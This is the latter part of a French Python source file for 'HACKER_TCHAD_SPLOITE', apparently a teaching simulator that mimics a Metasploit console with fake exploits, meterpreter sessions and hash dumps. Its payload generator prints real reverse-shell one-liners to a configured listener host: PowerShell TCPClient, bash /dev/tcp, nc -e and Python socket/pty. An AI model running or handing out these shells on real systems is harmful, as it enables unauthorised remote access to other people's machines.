        # Simulation de l'exécution
        print(f"\n{Colors.CYAN}[*] Démarrage de l'exécution du module...{Colors.END}")
        time.sleep(0.5)
        
        rhost = self.global_options.get('RHOSTS', '127.0.0.1')
        rport = self.global_options.get('RPORT', '80')
        lhost = self.global_options.get('LHOST', self._get_local_ip())
        lport = self.global_options.get('LPORT', '4444')
        
        self.print_info(f"Cible : {rhost}:{rport}")
        self.print_info(f"Listener : {lhost}:{lport}")
        
        # Simulation de différentes phases
        phases = [
            ("Initialisation du module...", 0.3),
            ("Configuration du payload...", 0.5),
            ("Établissement de la connexion...", 0.7),
            ("Envoi de l'exploit...", 1.0),
            ("Attente de réponse...", 1.5),
        ]
        
        for phase, delay in phases:
            self.print_info(phase)
            time.sleep(delay)
        
        # Simulation de succès ou d'échec basé sur l'IP locale
        if rhost in ['127.0.0.1', 'localhost', self._get_local_ip()]:
            self.print_success("Exploit réussi ! Session ouverte !")
            
            # Créer une session simulée
            session_id = len(self.sessions) + 1
            self.sessions[session_id] = {
                'type': 'meterpreter' if 'meterpreter' in self.current_module else 'shell',
                'target': rhost,
                'opened': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'info': f"{module_info['name']} sur {rhost}"
            }
            
            print(f"\n{Colors.GREEN}[+] Session {session_id} ouverte ({self.sessions[session_id]['type']}){Colors.END}")
            print(f"{Colors.GREEN}[+] {self.sessions[session_id]['info']}{Colors.END}")
            print(f"\n{Colors.CYAN}Commandes disponibles pour cette session :{Colors.END}")
            print(f"  {Colors.YELLOW}sessions -i {session_id}{Colors.END}  - Interagir avec la session")
            print(f"  {Colors.YELLOW}sessions -k {session_id}{Colors.END}  - Fermer la session")
            print(f"  {Colors.YELLOW}background{Colors.END}           - Mettre en arrière-plan\n")
        else:
            self.print_warning("La cible ne semble pas accessible depuis ce réseau.")
            self.print_info("Pour la démonstration, utilisez 127.0.0.1 ou votre IP locale.")
            self.print_info("Dans un environnement réel, assurez-vous d'avoir l'autorisation de tester la cible.")
    
    def cmd_check(self, args: List[str] = None):
        """Vérifie si la cible est vulnérable (simulation)."""
        if not self.current_module:
            self.print_error("Aucun module sélectionné")
            return
        
        rhost = self.global_options.get('RHOSTS', '127.0.0.1')
        rport = self.global_options.get('RPORT', '80')
        
        self.print_info(f"Vérification de la vulnérabilité sur {rhost}:{rport}...")
        time.sleep(1)
        
        if rhost in ['127.0.0.1', 'localhost']:
            self.print_success("La cible semble VULNÉRABLE !")
            self.print_info("Utilisez 'exploit' pour tenter l'exploitation")
        else:
            self.print_warning("Impossible de déterminer la vulnérabilité depuis ce réseau")
    
    def cmd_sessions(self, args: List[str] = None):
        """Gère les sessions actives."""
        if not args:
            if not self.sessions:
                self.print_info("Aucune session active")
                return
            
            print(f"\n{Colors.CYAN}Sessions actives{Colors.END}")
            print(f"{'═' * 80}")
            print(f"{Colors.YELLOW}{'ID':<5} {'Type':<15} {'Cible':<20} {'Ouverte':<20} {'Info':<25}{Colors.END}")
            print(f"{'─' * 80}")
            
            for sid, sinfo in self.sessions.items():
                print(f"{sid:<5} {sinfo['type']:<15} {sinfo['target']:<20} {sinfo['opened']:<20} {sinfo['info']:<25}")
            print()
            return
        
        if args[0] == '-i' and len(args) > 1:
            session_id = int(args[1])
            if session_id in self.sessions:
                self._interact_session(session_id)
            else:
                self.print_error(f"Session {session_id} non trouvée")
        
        elif args[0] == '-k' and len(args) > 1:
            session_id = int(args[1])
            if session_id in self.sessions:
                del self.sessions[session_id]
                self.print_success(f"Session {session_id} fermée")
            else:
                self.print_error(f"Session {session_id} non trouvée")
    
    def _interact_session(self, session_id: int):
        """Interagit avec une session Meterpreter/Shell."""
        session = self.sessions.get(session_id)
        if not session:
            return
        
        print(f"\n{Colors.GREEN}[+] Interaction avec la session {session_id} ({session['type']}){Colors.END}")
        print(f"{Colors.YELLOW}[!] Tapez 'help' pour les commandes, 'background' pour revenir, 'exit' pour quitter{Colors.END}\n")
        
        while True:
            if session['type'] == 'meterpreter':
                prompt = f"{Colors.RED}meterpreter{Colors.END} > "
            else:
                prompt = f"{Colors.RED}shell{Colors.END} > "
            
            cmd = input(prompt).strip()
            
            if cmd == 'background':
                self.print_info("Session mise en arrière-plan")
                break
            elif cmd == 'exit':
                del self.sessions[session_id]
                self.print_success(f"Session {session_id} fermée")
                break
            elif cmd == 'help':
                self._print_session_help(session['type'])
            elif cmd == 'sysinfo':
                self._simulate_sysinfo()
            elif cmd == 'getuid':
                self.print_info("Serveur : root / Administrateur")
            elif cmd == 'ps':
                self._simulate_ps()
            elif cmd == 'ls' or cmd == 'dir':
                self._simulate_ls()
            elif cmd.startswith('cd '):
                self.print_info(f"Répertoire changé vers : {cmd[3:]}")
            elif cmd.startswith('cat ') or cmd.startswith('type '):
                self.print_info(f"Contenu de {cmd.split()[1]}:")
                print("  Ceci est un contenu simulé pour l'apprentissage.")
            elif cmd == 'ipconfig' or cmd == 'ifconfig':
                self._simulate_network()
            elif cmd == 'screenshot':
                self.print_success("Capture d'écran sauvegardée : screenshot_001.png")
            elif cmd == 'webcam_snap':
                self.print_success("Photo webcam sauvegardée : webcam_001.jpg")
            elif cmd == 'hashdump':
                self._simulate_hashdump()
            elif cmd == 'clearev':
                self.print_success("Journaux d'événements effacés")
            elif cmd == 'reboot':
                self.print_warning("Redémarrage du système cible...")
            elif cmd == 'shutdown':
                self.print_warning("Arrêt du système cible...")
            elif cmd:
                self.print_info(f"Commande exécutée : {cmd}")
                print(f"  {Colors.DARK}[Simulation] Résultat de la commande{Colors.END}")
    
    def _print_session_help(self, session_type: str):
        """Affiche l'aide des commandes de session."""
        if session_type == 'meterpreter':
            help_text = f"""
{Colors.CYAN}Commandes Meterpreter :{Colors.END}
{'─' * 60}
  {Colors.GREEN}sysinfo{Colors.END}           Informations système
  {Colors.GREEN}getuid{Colors.END}            Identifiant de l'utilisateur courant
  {Colors.GREEN}ps{Colors.END}               Liste des processus
  {Colors.GREEN}ls / dir{Colors.END}         Liste les fichiers
  {Colors.GREEN}cd <path>{Colors.END}         Change de répertoire
  {Colors.GREEN}cat <file>{Colors.END}        Affiche le contenu d'un fichier
  {Colors.GREEN}download <file>{Colors.END}   Télécharge un fichier
  {Colors.GREEN}upload <file>{Colors.END}     Upload un fichier
  {Colors.GREEN}screenshot{Colors.END}        Capture d'écran
  {Colors.GREEN}webcam_snap{Colors.END}       Photo via la webcam
  {Colors.GREEN}hashdump{Colors.END}          Dump des hashes Windows
  {Colors.GREEN}clearev{Colors.END}           Efface les journaux d'événements
  {Colors.GREEN}ipconfig / ifconfig{Colors.END}  Configuration réseau
  {Colors.GREEN}reboot{Colors.END}            Redémarre le système
  {Colors.GREEN}shutdown{Colors.END}          Arrête le système
  {Colors.GREEN}background{Colors.END}        Met la session en arrière-plan
  {Colors.GREEN}exit{Colors.END}              Ferme la session
"""
        else:
            help_text = f"""
{Colors.CYAN}Commandes Shell :{Colors.END}
{'─' * 60}
  {Colors.GREEN}ls / dir{Colors.END}         Liste les fichiers
  {Colors.GREEN}cd <path>{Colors.END}         Change de répertoire
  {Colors.GREEN}cat <file> / type <file>{Colors.END}  Affiche le contenu
  {Colors.GREEN}pwd / cd{Colors.END}          Répertoire courant
  {Colors.GREEN}ipconfig / ifconfig{Colors.END}  Configuration réseau
  {Colors.GREEN}ps / tasklist{Colors.END}     Liste des processus
  {Colors.GREEN}background{Colors.END}        Met la session en arrière-plan
  {Colors.GREEN}exit{Colors.END}              Ferme la session
"""
        print(help_text)
    
    def _simulate_sysinfo(self):
        """Simule les informations système."""
        print(f"""
{Colors.CYAN}Informations Système :{Colors.END}
{'─' * 40}
  Computer        : TARGET-PC
  OS              : Windows 10 Pro (Build 19045)
  Architecture    : x64
  System Language : fr_FR
  Domain          : WORKGROUP
  Logged On Users : 2
  Meterpreter     : x64/windows
""")
    
    def _simulate_ps(self):
        """Simule la liste des processus."""
        processes = [
            (1234, 'explorer.exe', 'TARGET-PC\\User'),
            (5678, 'chrome.exe', 'TARGET-PC\\User'),
            (9012, 'svchost.exe', 'NT AUTHORITY\\SYSTEM'),
            (3456, 'lsass.exe', 'NT AUTHORITY\\SYSTEM'),
            (7890, 'services.exe', 'NT AUTHORITY\\SYSTEM'),
        ]
        print(f"\n{Colors.CYAN}Processus :{Colors.END}")
        print(f"{'PID':<10} {'Nom':<25} {'Utilisateur'}")
        print(f"{'─' * 60}")
        for pid, name, user in processes:
            print(f"{pid:<10} {name:<25} {user}")
        print()
    
    def _simulate_ls(self):
        """Simule la liste des fichiers."""
        print(f"\n{Colors.CYAN}Répertoire courant : C:\\Users\\User\\Documents{Colors.END}")
        print(f"{'Mode':<10} {'Size':<10} {'Type':<10} {'Last Modified':<20} {'Name'}")
        print(f"{'─' * 80}")
        items = [
            ('drwxrwxrwx', '0', '<DIR>', '2024-01-15 10:30', 'Documents'),
            ('drwxrwxrwx', '0', '<DIR>', '2024-01-14 09:15', 'Downloads'),
            ('-rw-rw-rw-', '15432', '', '2024-01-13 14:22', 'passwords.txt'),
            ('-rw-rw-rw-', '8901', '', '2024-01-12 11:45', 'notes.docx'),
            ('-rw-rw-rw-', '23456', '', '2024-01-11 16:30', 'budget_2024.xlsx'),
        ]
        for mode, size, type_, date, name in items:
            print(f"{mode:<10} {size:<10} {type_:<10} {date:<20} {name}")
        print()
    
    def _simulate_network(self):
        """Simule la configuration réseau."""
        print(f"""
{Colors.CYAN}Configuration Réseau :{Colors.END}
{'─' * 40}

Carte Ethernet Ethernet0 :
    Adresse IPv4. . . . . . . . . . . . . : 192.168.1.100
    Masque de sous-réseau. . . . . . . . : 255.255.255.0
    Passerelle par défaut. . . . . . . . : 192.168.1.1

Carte Wi-Fi Wi-Fi0 :
    Adresse IPv4. . . . . . . . . . . . . : 192.168.0.50
    Masque de sous-réseau. . . . . . . . : 255.255.255.0
    Passerelle par défaut. . . . . . . . : 192.168.0.1
""")
    
    def _simulate_hashdump(self):
        """Simule le dump des hashes."""
        print(f"""
{Colors.CYAN}Dump des hashes Windows :{Colors.END}
{'─' * 60}
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
User:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
""")
    
    def cmd_jobs(self, args: List[str] = None):
        """Gère les jobs en cours."""
        if not self.jobs:
            self.print_info("Aucun job en cours")
            return
        
        print(f"\n{Colors.CYAN}Jobs actifs{Colors.END}")
        print(f"{'═' * 60}")
        print(f"{Colors.YELLOW}{'ID':<5} {'Nom':<30} {'Démarré':<20}{Colors.END}")
        print(f"{'─' * 60}")
        for job in self.jobs:
            print(f"{job['id']:<5} {job['name']:<30} {job['started']:<20}")
        print()
    
    def cmd_generate(self, args: List[str] = None):
        """Génère un payload configuré."""
        if not self.current_module or self.current_module not in self.payload_db:
            self.print_error("Sélectionnez d'abord un payload avec 'use <payload>'")
            return
        
        lhost = self.global_options.get('LHOST', self._get_local_ip())
        lport = self.global_options.get('LPORT', '4444')
        
        self.print_info("Génération du payload...")
        time.sleep(0.5)
        
        # Générer différents types de payloads selon la plateforme
        payload_info = self.payload_db[self.current_module]
        platform = payload_info['platform']
        
        print(f"\n{Colors.CYAN}Payload généré :{Colors.END}")
        print(f"{'═' * 80}")
        
        if platform == 'windows':
            print(f"{Colors.YELLOW}# PowerShell one-liner :{Colors.END}")
            print(f"powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"")
            print(f"\n{Colors.YELLOW}# Commande msfvenom équivalente :{Colors.END}")
            print(f"msfvenom -p {self.current_module} LHOST={lhost} LPORT={lport} -f exe -o payload.exe")
        
        elif platform == 'linux':
            print(f"{Colors.YELLOW}# Bash one-liner :{Colors.END}")
            print(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
            print(f"\n{Colors.YELLOW}# Netcat :{Colors.END}")
            print(f"nc -e /bin/sh {lhost} {lport}")
            print(f"\n{Colors.YELLOW}# Commande msfvenom équivalente :{Colors.END}")
            print(f"msfvenom -p {self.current_module} LHOST={lhost} LPORT={lport} -f elf -o payload.elf")
        
        elif platform == 'python':
            print(f"{Colors.YELLOW}# Python reverse shell :{Colors.END}")
            print(f"""python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')" """)
        
        elif platform == 'android':
            print(f"{Colors.YELLOW}# Commande msfvenom :{Colors.END}")
            print(f"msfvenom -p {self.current_module} LHOST={lhost} LPORT={lport} -o payload.apk")
        
        elif platform == 'unix':
            print(f"{Colors.YELLOW}# Bash reverse shell :{Colors.END}")
            print(f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
        
        print(f"\n{Colors.GREEN}[+] Payload prêt ! Démarrez un listener avec :{Colors.END}")
        print(f"    nc -lvnp {lport}")
        print(f"{'═' * 80}\n")
    
    def cmd_workspace(self, args: List[str] = None):
        """Gère les workspaces."""
        if not args:
            self.print_info(f"Workspace courant : {self.workspace}")
            return
        
        if args[0] == '-a' and len(args) > 1:
            self.print_success(f"Workspace créé : {args[1]}")
        elif args[0] == '-d' and len(args) > 1:
            self.print_success(f"Workspace supprimé : {args[1]}")
        else:
            self.workspace = args[0]
            self.print_success(f"Workspace changé : {self.workspace}")
    
    def cmd_banner(self, args: List[str] = None):
        """Réaffiche la bannière."""
        self.clear_screen()
        self.print_banner()
    
    def cmd_version(self, args: List[str] = None):
        """Affiche la version."""
        print(f"\n{Colors.CYAN}HACKER_TCHAD_SPLOITE{Colors.END}")
        print(f"Version : {Colors.BOLD}{self.version}{Colors.END}")
        print(f"Développé par : {Colors.BOLD}{self.author}{Colors.END}")
        print(f"Python : {sys.version}\n")
    
    def cmd_history(self, args: List[str] = None):
        """Affiche l'historique des commandes."""
        if not self.session_history:
            self.print_info("Historique vide")
            return
        
        print(f"\n{Colors.CYAN}Historique des commandes :{Colors.END}")
        for i, cmd in enumerate(self.session_history[-20:], 1):
            print(f"  {i:3d}  {cmd}")
        print()
    
    def cmd_resource(self, args: List[str]):
        """Exécute un fichier de commandes."""
        if not args:
            self.print_error("Usage: resource <fichier.rc>")
            return
        
        filename = args[0]
        if not os.path.exists(filename):
            self.print_error(f"Fichier non trouvé : {filename}")
            return
        
        self.print_info(f"Exécution du fichier de ressources : {filename}")
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    self.print_info(f"Exécution : {line}")
                    self.process_command(line)
    
    def cmd_save(self, args: List[str] = None):
        """Sauvegarde la configuration."""
        config = {
            'global_options': self.global_options,
            'current_module': self.current_module,
            'workspace': self.workspace
        }
        
        filename = f"{self.workspace}_config.rc"
        with open(filename, 'w') as f:
            for key, value in self.global_options.items():
                f.write(f"setg {key} {value}\n")
            if self.current_module:
                f.write(f"use {self.current_module}\n")
        
        self.print_success(f"Configuration sauvegardée dans : {filename}")
    
    def process_command(self, command: str):
        """Traite une commande utilisateur."""
        if not command.strip():
            return
        
        self.session_history.append(command)
        
        parts = command.split()
        cmd = parts[0].lower()
        args = parts[1:]
        
        commands = {
            'help': self.cmd_help,
            '?': self.cmd_help,
            'use': self.cmd_use,
            'show': self.cmd_show,
            'info': self.cmd_info,
            'search': self.cmd_search,
            'set': self.cmd_set,
            'unset': self.cmd_unset,
            'setg': self.cmd_setg,
            'unsetg': self.cmd_unsetg,
            'exploit': self.cmd_exploit,
            'run': self.cmd_exploit,
            'check': self.cmd_check,
            'sessions': self.cmd_sessions,
            'jobs': self.cmd_jobs,
            'generate': self.cmd_generate,
            'workspace': self.cmd_workspace,
            'banner': self.cmd_banner,
            'version': self.cmd_version,
            'history': self.cmd_history,
            'resource': self.cmd_resource,
            'save': self.cmd_save,
            'background': lambda x: self.print_info("Pas de session active en premier plan"),
            'exit': lambda x: sys.exit(0),
            'quit': lambda x: sys.exit(0),
        }
        
        if cmd in commands:
            try:
                commands[cmd](args)
            except Exception as e:
                self.print_error(f"Erreur : {str(e)}")
        else:
            self.print_error(f"Commande inconnue : {cmd}")
            self.print_info("Tapez 'help' pour la liste des commandes")
    
    def run(self):
        """Boucle principale du framework."""
        self.clear_screen()
        self.print_banner()
        
        self.print_info("Bienvenue dans HACKER_TCHAD_SPLOITE !")
        self.print_info("Tapez 'help' pour la liste des commandes")
        self.print_info("Commencez par : show exploits | show payloads | show auxiliary")
        print()
        
        while True:
            try:
                command = self.print_prompt()
                self.process_command(command)
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[!] Utilisez 'exit' pour quitter{Colors.END}")
            except EOFError:
                print()
                break


def main():
    """Point d'entrée principal."""
    framework = HackerTchadSploite()
    framework.run()


if __name__ == '__main__':
    main()
